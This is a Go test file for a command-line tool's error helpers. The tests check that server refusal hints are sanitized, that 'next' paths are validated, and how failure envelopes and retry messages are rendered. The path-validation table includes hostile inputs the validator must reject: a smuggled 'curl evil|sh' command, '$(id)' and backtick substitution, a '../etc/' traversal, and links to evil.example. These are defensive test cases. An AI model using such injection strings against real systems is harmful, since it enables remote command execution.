package utils

import (
	"errors"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// hintedError stands in for the client's coded refusal.
type hintedError struct {
	code, hint string
}

func (e *hintedError) Error() string       { return "permission denied" }
func (e *hintedError) ErrorCode() string   { return e.code }
func (e *hintedError) ErrorSource() string { return "" }
func (e *hintedError) ErrorHint() string   { return e.hint }

const sampleHint = "Your roles do not allow this action; it needs a role that covers it."

func TestSanitizeServerHint(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		hint string
		want string
	}{
		{name: "a clean hint is kept as sent", hint: sampleHint, want: sampleHint},
		{name: "empty", hint: "", want: ""},
		{name: "surrounding space is trimmed", hint: "  " + sampleHint + "  ", want: sampleHint},
		{name: "newlines cannot open a line of their own", hint: "Open\n a\r work\t session.", want: "Open a work session."},
		{name: "ANSI escapes are removed whole", hint: "Open\x1b[2K a session.", want: "Open a session."},
		{name: "C1 controls are removed", hint: "Open\u0080\u009b a session.", want: "Open a session."},
		{name: "bidi and format characters are removed", hint: "Open\u200b\u202e\u2066\ufeff a session.", want: "Open a session."},
		{name: "invalid UTF-8 is dropped", hint: "Open \xe2 a session.", want: "Open  a session."},
		{name: "a control-only hint is empty", hint: "\n\r\t\x1b", want: ""},
		{name: "an over-long hint is cut to the cap", hint: strings.Repeat("x", 300), want: strings.Repeat("x", MaxServerHintBytes)},
		{
			// A two-byte character straddling the cap goes whole rather than
			// leaving half of it on the line.
			name: "the cut never splits a character",
			hint: strings.Repeat("x", MaxServerHintBytes-1) + "é",
			want: strings.Repeat("x", MaxServerHintBytes-1),
		},
		{
			name: "a character that ends at the cap is kept",
			hint: strings.Repeat("x", MaxServerHintBytes-2) + "é" + "tail",
			want: strings.Repeat("x", MaxServerHintBytes-2) + "é",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := SanitizeServerHint(tt.hint)
			assert.Equal(t, tt.want, got)
			assert.LessOrEqual(t, len(got), MaxServerHintBytes)
		})
	}
}

func TestRefusalNextActions(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		err  error
		want []NextAction
	}{
		{name: "a hint becomes one guidance action", err: &hintedError{hint: sampleHint}, want: []NextAction{{Description: sampleHint}}},
		{name: "a wrapped refusal still carries it", err: fmt.Errorf("failed to list servers: %w", &hintedError{hint: sampleHint}), want: []NextAction{{Description: sampleHint}}},
		{name: "the hint is sanitized", err: &hintedError{hint: "Retry\x1b[31m later.\n"}, want: []NextAction{{Description: "Retry later."}}},
		{name: "no hint", err: &hintedError{code: "permission_denied"}},
		{name: "a control-only hint is none", err: &hintedError{hint: "\x1b\n"}},
		{name: "a plain error", err: errors.New("boom")},
		{name: "nil", err: nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, RefusalNextActions(tt.err))
		})
	}
}

func TestNewFailureEnvelope_CarriesTheServerHint(t *testing.T) {
	t.Parallel()
	err := fmt.Errorf("failed to grant role: %w", &hintedError{code: "rbac_permission_required", hint: sampleHint})
	rendered, fmtErr := FormatJSON(newFailureEnvelope(ExitCodeGeneralError, "", "role grant", err, "Failed to grant role."))
	require.NoError(t, fmtErr)

	assert.JSONEq(t, `{
		"ok": false,
		"exit_code": 1,
		"error_code": "rbac_permission_required",
		"message": "Failed to grant role.",
		"context": {"operation": "role grant"},
		"next_actions": [{"description": "`+sampleHint+`"}]
	}`, rendered)
}

func TestNewFailureEnvelope_NoHintNoNextActions(t *testing.T) {
	t.Parallel()
	env := newFailureEnvelope(ExitCodeGeneralError, "", "role grant", &hintedError{code: "rbac_permission_required"}, "Failed to grant role.")

	rendered, err := FormatJSON(env)
	require.NoError(t, err)
	assert.NotContains(t, rendered, "next_actions")
}

// The error helpers find the refusal among their own arguments, so a call
// site that formats a server error into its message prints the hint too.
func TestCliError_PrintsTheServerHintUnderTheErrorLine(t *testing.T) {
	pinColor(t, false)

	t.Run("with a hint", func(t *testing.T) {
		err := fmt.Errorf("permission denied: %w", &hintedError{hint: sampleHint})
		stderr := captureStderr(t, func() { CliError("failed to list servers: %s", err) })

		assert.True(t, strings.HasPrefix(stderr,
			"Error: failed to list servers: permission denied: permission denied\nHint: "+sampleHint+"\n"),
			"stderr: %q", stderr)
	})

	t.Run("without a hint", func(t *testing.T) {
		stderr := captureStderr(t, func() { CliError("failed to list servers: %s", &hintedError{code: "permission_denied"}) })

		assert.NotContains(t, stderr, "Hint:")
	})

	t.Run("a hint with control characters is printed clean", func(t *testing.T) {
		stderr := captureStderr(t, func() {
			CliError("failed: %s", &hintedError{hint: "Retry\nError: forged\x1b[2K later."})
		})

		assert.Contains(t, stderr, "Hint: RetryError: forged later.\n")
		assert.NotContains(t, stderr, "\x1b")
	})
}

func TestInteractiveOnly_DefersToTheServerHint(t *testing.T) {
	t.Parallel()
	hinted := &hintedError{code: AuthInteractiveChannelRequiresPresence, hint: sampleHint}
	assert.Same(t, hinted, InteractiveOnly(hinted, "open a Websh session"))

	plain := &hintedError{code: AuthInteractiveChannelRequiresPresence}
	assert.ErrorContains(t, InteractiveOnly(plain, "open a Websh session"), "a token cannot open a Websh session")
}

func TestReword_KeepsTheRefusalBehindTheMessage(t *testing.T) {
	t.Parallel()
	refusal := &hintedError{code: "permission_denied", hint: sampleHint}
	reworded := Reword(refusal, "Failed to delete the CA: permission denied.")

	assert.Equal(t, "Failed to delete the CA: permission denied.", reworded.Error())
	assert.Equal(t, sampleHint, RefusalHint(reworded))
	code, _ := ParseErrorResponse(reworded)
	assert.Equal(t, "permission_denied", code)
	assert.ErrorIs(t, reworded, refusal)
}

// An error that joins several refusals yields each distinct hint once, in
// order, and RefusalHint reads the first.
func TestRefusalNextActions_JoinedRefusals(t *testing.T) {
	t.Parallel()
	const other = "Too many requests were made in a short time; wait, then retry."
	joined := errors.Join(
		fmt.Errorf("a.txt: %w", &hintedError{hint: sampleHint}),
		errors.New("b.txt: disk full"),
		fmt.Errorf("c.txt: %w", &hintedError{hint: sampleHint}),
		fmt.Errorf("d.txt: %w", &hintedError{hint: other}),
	)

	assert.Equal(t, []NextAction{{Description: sampleHint}, {Description: other}}, RefusalNextActions(joined))
	assert.Equal(t, sampleHint, RefusalHint(joined))
}

// A warning that formats a refusal prints its hint under the line, as the
// error helpers do.
func TestCliWarning_PrintsTheServerHint(t *testing.T) {
	pinColor(t, false)

	stderr := captureStderr(t, func() {
		CliWarning("Could not fetch user info: %s", &hintedError{hint: sampleHint})
	})
	assert.Equal(t, "Warning: Could not fetch user info: permission denied\nHint: "+sampleHint+"\n", stderr)

	stderr = captureStderr(t, func() { CliWarning("Could not fetch user info: %s", errors.New("timeout")) })
	assert.NotContains(t, stderr, "Hint:")
}

type statusOnly int

func (s statusOnly) Error() string       { return "status" }
func (s statusOnly) HTTPStatusCode() int { return int(s) }

// Joined errors have the status their children agree on, or none.
func TestHTTPStatusCode_JoinedErrors(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		err  error
		want int
	}{
		{name: "children agree", err: &BatchError{Header: "h", Failures: []error{statusOnly(403), fmt.Errorf("b: %w", statusOnly(403))}}, want: 403},
		{name: "a child without a status does not count", err: errors.Join(statusOnly(429), errors.New("disk full")), want: 429},
		{name: "children differ", err: &BatchError{Header: "h", Failures: []error{statusOnly(403), statusOnly(429)}}, want: 0},
		{name: "no child has one", err: errors.Join(errors.New("a"), errors.New("b")), want: 0},
		{name: "a wrapped batch", err: fmt.Errorf("upload: %w", &BatchError{Header: "h", Failures: []error{statusOnly(402)}}), want: 402},
		// A conflict inside a nested join is still a conflict at the top.
		{name: "nested joins disagree", err: errors.Join(errors.Join(statusOnly(403), statusOnly(429)), statusOnly(403)), want: 0},
		{name: "nested joins agree", err: errors.Join(errors.Join(statusOnly(403), errors.New("x")), statusOnly(403)), want: 403},
		{
			name: "nested batches disagree",
			err: &BatchError{Header: "h", Failures: []error{
				&BatchError{Header: "inner", Failures: []error{statusOnly(403), statusOnly(429)}},
				statusOnly(403),
			}},
			want: 0,
		},
		{
			name: "nested batches agree",
			err: &BatchError{Header: "h", Failures: []error{
				&BatchError{Header: "inner", Failures: []error{statusOnly(403), errors.New("disk full")}},
				fmt.Errorf("b: %w", statusOnly(403)),
			}},
			want: 403,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, HTTPStatusCode(tt.err))
		})
	}
}

// A batch hides its items' codes, while hints still read through it.
func TestBatchError_HidesItemCodesButNotHints(t *testing.T) {
	t.Parallel()
	batch := &BatchError{Header: "upload failed for 1 file(s)", Failures: []error{
		fmt.Errorf("a.txt: %w", &hintedError{code: AuthMFARequired, hint: sampleHint}),
	}}

	assert.Equal(t, "upload failed for 1 file(s):\n  a.txt: permission denied", batch.Error())
	code, _ := ParseErrorResponse(batch)
	assert.Empty(t, code)
	assert.Empty(t, StructuredErrorCode(batch))
	assert.Equal(t, sampleHint, RefusalHint(batch))
}

func TestRawTerminalHintLines(t *testing.T) {
	pinColor(t, false)
	assert.Equal(t, "Hint: "+sampleHint+"\r\n", RawTerminalHintLines(&hintedError{hint: sampleHint}))
	assert.Empty(t, RawTerminalHintLines(errors.New("boom")))
}

// HintOnly keeps a refusal's hint and nothing else of it, so whatever
// classifies the error sees a plain one.
func TestHintOnly(t *testing.T) {
	t.Parallel()
	refusal := fmt.Errorf("read: %w", &hintedError{code: WorkSessionExpired, hint: "Retry\nlater."})

	timedOut := HintOnly("timed out", refusal)
	assert.Equal(t, "timed out", timedOut.Error())
	assert.Equal(t, "Retrylater.", RefusalHint(timedOut))
	code, _ := ParseErrorResponse(timedOut)
	assert.Empty(t, code)
	assert.Empty(t, StructuredErrorCode(timedOut))
	_, wraps := timedOut.(interface{ Unwrap() error })
	assert.False(t, wraps, "a hint-only error wraps nothing")

	plain := HintOnly("timed out", nil)
	assert.Equal(t, "timed out", plain.Error())
	assert.Empty(t, RefusalHint(plain))
}

func TestHintOnly_CarriesNoNextOrRetry(t *testing.T) {
	t.Parallel()
	refusal := &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: time.Minute}

	got := RefusalNextActions(HintOnly("timed out", refusal))

	assert.Equal(t, []NextAction{{Description: sampleHint}}, got)
}

// refusedError stands in for the client's coded refusal with its whole envelope.
type refusedError struct {
	hint, next, gate string
	retryAfter       time.Duration
}

func (e *refusedError) Error() string             { return "permission denied" }
func (e *refusedError) ErrorCode() string         { return "future_denied" }
func (e *refusedError) ErrorSource() string       { return "" }
func (e *refusedError) ErrorHint() string         { return e.hint }
func (e *refusedError) ErrorNext() string         { return e.next }
func (e *refusedError) ErrorGate() string         { return e.gate }
func (e *refusedError) ErrorMissing() []string    { return nil }
func (e *refusedError) RetryAfter() time.Duration { return e.retryAfter }

func TestRefusalNextActions_NextMustBeASelfRelativePath(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		next string
		want bool
	}{
		{name: "a path", next: "/api/approvals/7/", want: true},
		{name: "empty", next: ""},
		{name: "no leading slash", next: "api/approvals/7/"},
		{name: "protocol relative", next: "//evil.example/x"},
		{name: "absolute URL", next: "https://evil.example/x"},
		{name: "backslash", next: `/a\b`},
		{name: "escape sequence", next: "/a\x1b[2Kb"},
		{name: "newline", next: "/a\nb"},
		{name: "format character", next: "/a\u202eb"},
		{name: "surrounding space", next: "/api/x/ "},
		{name: "inner space", next: "/api/x y/"},
		{name: "semicolon", next: "/api/x;curl evil|sh"},
		{name: "command substitution", next: "/api/$(id)/"},
		{name: "backtick", next: "/api/`id`/"},
		{name: "dot dot segment", next: "/api/../etc/"},
		{name: "dot segment", next: "/api/./x/"},
		{name: "query", next: "/api/x/?page=2&size=1"},
		{name: "fragment", next: "/api/x/#top"},
		{name: "no trailing slash", next: "/api/approvals/7", want: true},
		{name: "over long", next: "/" + strings.Repeat("a", MaxServerHintBytes)},
		{name: "at the cap", next: "/" + strings.Repeat("a", MaxServerHintBytes-1), want: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := RefusalNextActions(&refusedError{next: tt.next})

			if !tt.want {
				assert.Empty(t, got)
				return
			}
			assert.Equal(t, []NextAction{{
				Command:     "alpacon api " + tt.next,
				Description: "Where the server says to check on this refusal",
			}}, got)
		})
	}
}

func TestRefusalNextActions_NextIsFoundInTheChain(t *testing.T) {
	t.Parallel()
	err := fmt.Errorf("failed: %w", &refusedError{next: "/api/approvals/7/"})

	got := RefusalNextActions(err)

	require.Len(t, got, 1)
	assert.Equal(t, "alpacon api /api/approvals/7/", got[0].Command)
}

func TestRefusalNextActions_JoinedRefusalsShowTheFirstNext(t *testing.T) {
	t.Parallel()
	err := errors.Join(&refusedError{next: "/api/approvals/7/"}, &refusedError{next: "/api/approvals/8/"})

	got := RefusalNextActions(err)

	require.Len(t, got, 1)
	assert.Equal(t, "alpacon api /api/approvals/7/", got[0].Command)
}

func TestParseRefusalNext(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name   string
		status int
		body   string
		want   string
	}{
		{name: "403", status: http.StatusForbidden, body: `{"code": "x", "next": "/api/approvals/7/"}`, want: "/api/approvals/7/"},
		{name: "402", status: http.StatusPaymentRequired, body: `{"code": "x", "next": "/api/approvals/7/"}`, want: "/api/approvals/7/"},
		{name: "400 field of that name", status: http.StatusBadRequest, body: `{"code": "x", "next": "/api/approvals/7/"}`},
		{name: "401", status: http.StatusUnauthorized, body: `{"code": "x", "next": "/api/approvals/7/"}`},
		{name: "not a string", status: http.StatusForbidden, body: `{"code": "x", "next": ["/api/approvals/7/"]}`},
		{name: "absent", status: http.StatusForbidden, body: `{"code": "x"}`},
		{name: "not JSON", status: http.StatusForbidden, body: `<html></html>`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, ParseRefusalNext([]byte(tt.body), tt.status))
		})
	}
}

func TestRawTerminalHintLines_EndEveryActionWithCarriageReturn(t *testing.T) {
	pinColor(t, false)
	err := &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: 30 * time.Second}

	got := RawTerminalHintLines(err)

	assert.Equal(t, "Hint: "+sampleHint+"\r\n"+
		"Hint: alpacon api /api/approvals/7/  # Where the server says to check on this refusal\r\n"+
		"Hint: Retry after 30s\r\n", got)
}

func TestRefusalNextActions_RetryAfter(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		err  *refusedError
		want []NextAction
	}{
		{name: "gated refusal", err: &refusedError{gate: "rate", retryAfter: 30 * time.Second}, want: []NextAction{{Description: "Retry after 30s"}}},
		{name: "rounded up to whole seconds", err: &refusedError{gate: "rate", retryAfter: 1500 * time.Millisecond}, want: []NextAction{{Description: "Retry after 2s"}}},
		{name: "no gate", err: &refusedError{retryAfter: 30 * time.Second}},
		{name: "plan gate states the reset itself", err: &refusedError{gate: "plan", retryAfter: 30 * time.Second}},
		{name: "no delay", err: &refusedError{gate: "rate"}},
		{name: "largest header value", err: &refusedError{gate: "rate", retryAfter: 9223372036 * time.Second}, want: []NextAction{{Description: "Retry after 9223372036s"}}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tt.want, RefusalNextActions(tt.err))
		})
	}
}

func TestNewFailureEnvelope_NextActionsHoldHintThenNextThenRetry(t *testing.T) {
	t.Parallel()
	err := fmt.Errorf("failed to run: %w", &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: 30 * time.Second})
	rendered, fmtErr := FormatJSON(newFailureEnvelope(ExitCodeGeneralError, "", "exec", err, "Failed to run."))
	require.NoError(t, fmtErr)

	assert.JSONEq(t, `{
		"ok": false,
		"exit_code": 1,
		"error_code": "future_denied",
		"message": "Failed to run.",
		"context": {"operation": "exec"},
		"retry_after": 30,
		"next_actions": [
			{"description": "`+sampleHint+`"},
			{"command": "alpacon api /api/approvals/7/", "description": "Where the server says to check on this refusal"},
			{"description": "Retry after 30s"}
		]
	}`, rendered)
}

func TestCliError_PrintsHintNextAndRetryLines(t *testing.T) {
	pinColor(t, false)
	err := &refusedError{hint: sampleHint, next: "/api/approvals/7/", gate: "rate", retryAfter: 30 * time.Second}

	stderr := captureStderr(t, func() { CliError("failed to run: %s", err) })

	assert.Contains(t, stderr, "Error: failed to run: permission denied\n"+
		"Hint: "+sampleHint+"\n"+
		"Hint: alpacon api /api/approvals/7/  # Where the server says to check on this refusal\n"+
		"Hint: Retry after 30s\n")
}
